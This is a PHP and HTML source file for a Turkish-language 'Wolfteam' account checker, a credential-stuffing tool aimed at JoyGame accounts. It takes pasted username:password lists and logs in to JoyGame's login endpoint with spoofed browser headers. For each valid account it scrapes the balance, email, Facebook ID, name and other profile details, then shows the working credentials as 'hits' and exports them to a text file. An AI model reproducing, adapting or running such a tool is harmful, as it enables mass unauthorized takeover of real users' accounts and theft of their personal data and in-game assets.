<?php
session_start();
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

if (isset($_GET['action']) && $_GET['action'] == 'check') {
    header('Content-Type: application/json');
    error_reporting(0);
    
    $user = trim($_POST['user'] ?? '');
    $pass = trim($_POST['pass'] ?? '');

    function jg_request($url, $headers = [], $cookieStr = "") {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HEADER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        if (!empty($cookieStr)) {
            curl_setopt($ch, CURLOPT_COOKIE, $cookieStr);
        }
        
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        $response = curl_exec($ch);
        
        $header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $header = substr($response, 0, $header_size);
        $body = substr($response, $header_size);
        
        curl_close($ch);
        return ['header' => $header, 'body' => $body];
    }

    function lr_parse($string, $left, $right) {
        $data = explode($left, $string);
        if (isset($data[1])) {
            $data = explode($right, $data[1]);
            return trim($data[0]);
        }
        return null;
    }

    $enc_user = urlencode($user);
    $enc_pass = urlencode($pass);
    $time = time() . rand(100, 999);
    
    $loginUrl = "https://bservices.joygame.com/Hesap/JsonpLogin?callback=JG.ProccessLoginResponse&TopbarLoginUserName={$enc_user}&TopbarLoginPassword={$enc_pass}&TopbarLoginRemember=true&TopbarFacebookId=0&TopbarFacebookEmail=&ReturnUrl=&FormId=tb-login-form&siteLang=tr&__RequestVerificationToken=undefined&_={$time}";
    
    $h1 = [
        "Host: bservices.joygame.com",
        "Accept: */*",
        "Accept-Language: tr-TR,tr;q=0.9",
        "Referer: https://www.joygame.com/",
        "Sec-Ch-Ua: \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
        "Sec-Ch-Ua-Mobile: ?0",
        "Sec-Ch-Ua-Platform: \"Windows\"",
        "Sec-Fetch-Dest: script",
        "Sec-Fetch-Mode: no-cors",
        "Sec-Fetch-Site: same-site",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
    ];

    $res1 = jg_request($loginUrl, $h1);
    $body1 = $res1['body'];
    $header1 = $res1['header'];

    if (strpos($body1, '"IsSucceeded":true,') !== false) {
        
        $jpBalance = lr_parse($body1, '"JpBalance":', ',"') ?? '0';
        $fbId = lr_parse($body1, '"FacebookId":', ',"') ?? 'Yok';
        $fbEmail = lr_parse($body1, '"FacebookEmail":', ',"') ?? 'Yok';
        $createDate = lr_parse($body1, '"CreateDate":"', '","') ?? 'Bilinmiyor';
        $email = lr_parse($body1, '"EmailAddress":"', '","') ?? 'Bilinmiyor';
        $friendReq = lr_parse($body1, '"UnreadFriendRequestCount":', ',"') ?? '0';
        $unreadMsg = lr_parse($body1, '"UnreadMessageCount":', ',"') ?? '0';

        preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $header1, $matches);
        $cookieStr = implode('; ', $matches[1]);

        $h2 = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma: no-cache",
            "Accept: */*"
        ];
        
        $res2 = jg_request("https://uyelik.joygame.com/Profil/Duzenle", $h2, $cookieStr);
        $body2 = $res2['body'];

        $gender = lr_parse($body2, 'value="Woman">', '</option>') ?? 'Bilinmiyor';
        $firstName = lr_parse($body2, 'class="form-control" id="FirstName" name="FirstName" type="text" value="', '" />') ?? 'Bilinmiyor';
        $lastName = lr_parse($body2, 'class="form-control" id="LastName" name="LastName" type="text" value="', '" />') ?? 'Bilinmiyor';

        $detaylar = "İsim: $firstName $lastName | Cinsiyet: $gender | Kurulum: $createDate | Kayıtlı Mail: $email | FB ID: $fbId | İstekler: $friendReq | Mesaj: $unreadMsg";

        echo json_encode([
            'status' => 'success',
            'user' => $user, 
            'pass' => $pass,
            'sayi' => $jpBalance, 
            'arabalar' => $detaylar
        ]);
    } else {
        echo json_encode(['status' => 'fail', 'user' => $user, 'pass' => $pass]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WOLFTEAM EXPORT EDITION | CPM STYLE</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { background-color: #030303; color: #e2e8f0; font-family: 'Inter', sans-serif; overflow-x: hidden; }
        
        /* Wolfteam Temasına Özel Renkler */
        .neon-red { box-shadow: 0 0 15px rgba(220, 38, 38, 0.2); border: 1px solid rgba(220, 38, 38, 0.4); }
        .neon-orange { box-shadow: 0 0 15px rgba(249, 115, 22, 0.15); border: 1px solid rgba(249, 115, 22, 0.3); }
        .neon-green { box-shadow: 0 0 15px rgba(16, 185, 129, 0.15); border: 1px solid rgba(16, 185, 129, 0.3); }
        .neon-darkred { box-shadow: 0 0 15px rgba(153, 27, 27, 0.2); border: 1px solid rgba(153, 27, 27, 0.4); }
        
        .main-card { background: rgba(15, 10, 10, 0.9); backdrop-filter: blur(10px); border-radius: 16px; transition: all 0.3s ease; border: 1px solid rgba(255,255,255,0.05); }
        .input-area { background: #0a0505; border: 1px solid #3f1515; border-radius: 12px; color: #f87171; font-family: 'Consolas', monospace; width: 100%; outline: none; }
        .input-area:focus { border-color: #ef4444; }
        .hit-box { background: linear-gradient(145deg, #1a0b0b, #0a0505); border-left: 4px solid #10b981; border-radius: 12px; }
    </style>
</head>
<body class="p-4 md:p-8">
    <div class="max-w-[1500px] mx-auto flex justify-between items-center mb-8">
        <div class="flex items-center gap-3">
            <div class="w-11 h-11 bg-red-700 rounded-lg flex items-center justify-center shadow-lg shadow-red-700/30">
                <i class="fa-solid fa-paw text-white text-xl"></i>
            </div>
            <h1 class="text-2xl font-black tracking-tighter italic" style="font-family: 'Syncopate', sans-serif;">WOLF<span class="text-red-500">Team</span></h1>
        </div>
        <a href="index.php" class="bg-white/5 hover:bg-red-600 border border-white/10 px-5 py-2.5 rounded-xl text-xs font-black uppercase tracking-widest transition-all italic">Geri Çıkış</a>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 md:grid-cols-3 gap-5 mb-8">
        <div class="main-card p-6 neon-orange">
            <span class="text-gray-500 text-[10px] font-black uppercase mb-1.5 block">Kalan</span>
            <div class="text-4xl font-black" id="kalan_val">BİTTİ</div>
        </div>
        <div class="main-card p-6 neon-green">
            <span class="text-green-500 text-[10px] font-black uppercase mb-1.5 block">Hit</span>
            <div class="text-4xl font-black text-green-500" id="hit_count">0</div>
        </div>
        <div class="main-card p-6 neon-darkred">
            <span class="text-red-600 text-[10px] font-black uppercase mb-1.5 block">Fail</span>
            <div class="text-4xl font-black text-red-600" id="fail_count">0</div>
        </div>
    </div>

    <div class="max-w-[1500px] mx-auto grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div class="lg:col-span-4 space-y-5">
            <div class="main-card p-6 neon-red">
                <textarea id="accs" class="input-area h-[220px] p-4 text-xs" placeholder="kullanıcı_adı:şifre"></textarea>
                <button id="btn" onclick="startCheck()" class="w-full mt-5 py-4 bg-red-700 hover:bg-red-600 rounded-xl text-white font-black uppercase tracking-widest text-sm shadow-md active:scale-95 transition-all">Taramayı Başlat</button>
            </div>
            <div class="main-card p-5 h-32 overflow-y-auto bg-black/50 font-mono text-[10px] text-red-300" id="mini_log">Sistem Hazır.</div>
        </div>

        <div class="lg:col-span-8">
            <div class="flex justify-between items-end mb-4">
                <h2 class="text-xl font-black uppercase italic text-gray-200">Canlı Sonuçlar</h2>
                <button onclick="downloadHits()" class="bg-green-600 hover:bg-green-500 text-white px-6 py-3 rounded-xl text-xs font-black uppercase tracking-widest transition-all">TXT İndir</button>
            </div>
            <div class="main-card p-6 h-[660px] overflow-y-auto space-y-5 neon-red" id="hitLog">
                <div class="flex flex-col items-center justify-center h-full opacity-10 italic font-black uppercase">Veri Bekleniyor...</div>
            </div>
        </div>
    </div>

    <script>
        let running = false; let hits = 0; let fails = 0; let hitResults = [];
        
        async function startCheck() {
            const list = document.getElementById('accs').value.split('\n').filter(l => l.includes(':'));
            if(!list.length) return alert("Liste boş!");
            if(running) { running = false; return; }
            
            running = true;
            const btn = document.getElementById('btn');
            btn.innerText = "DURDUR"; 
            btn.classList.replace('bg-red-700', 'bg-red-900');
            document.getElementById('kalan_val').innerText = list.length;
            
            for(let line of list) {
                if(!running) break;
                const [u, p] = line.trim().split(':');
                try {
                    const fd = new FormData(); 
                    fd.append('user', u); 
                    fd.append('pass', p);
                    
                    const resp = await fetch('?action=check', { method: 'POST', body: fd });
                    const res = await resp.json();
                    const log = document.getElementById('mini_log');
                    
                    if(res.status === 'success') {
                        hits++; 
                        document.getElementById('hit_count').innerText = hits;
                        hitResults.push(`${res.user}:${res.pass} | JP: ${res.sayi} | ${res.arabalar}`);
                        addHit(res);
                        log.innerHTML = `<div style="color:#10b981">[HIT] ${u}</div>` + log.innerHTML;
                    } else { 
                        fails++; 
                        document.getElementById('fail_count').innerText = fails; 
                        log.innerHTML = `<div style="color:#ef4444">[FAIL] ${u}</div>` + log.innerHTML;
                    }
                } catch(e) { }
                document.getElementById('kalan_val').innerText = parseInt(document.getElementById('kalan_val').innerText) - 1;
            }
            running = false; 
            btn.innerText = "TARAMAYI BAŞLAT"; 
            btn.classList.replace('bg-red-900', 'bg-red-700');
            document.getElementById('kalan_val').innerText = "BİTTİ";
        }

        function addHit(res) {
            const log = document.getElementById('hitLog');
            if(hits === 1) log.innerHTML = '';
            const div = document.createElement('div');
            div.className = 'hit-box p-5 mb-4 border-l-4 border-green-500 shadow-lg';
            div.innerHTML = `
                <div class="flex justify-between items-center mb-2">
                    <span class="text-sm font-bold text-red-400"><i class="fa-solid fa-user text-xs mr-1"></i> ${res.user}:${res.pass}</span>
                    <span class="text-2xl font-black text-green-500"><span class="text-xs text-gray-500 mr-1">JP</span>${res.sayi}</span>
                </div>
                <div class="text-[11px] font-mono text-gray-400 italic bg-black/40 p-2 rounded">${res.arabalar}</div>
            `;
            log.prepend(div);
        }

        function downloadHits() {
            if (!hitResults.length) return;
            const blob = new Blob([hitResults.join('\n')], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url; 
            a.download = `Wolfteam_Hits_${new Date().getTime()}.txt`; 
            a.click();
        }
    </script>
</body>
</html>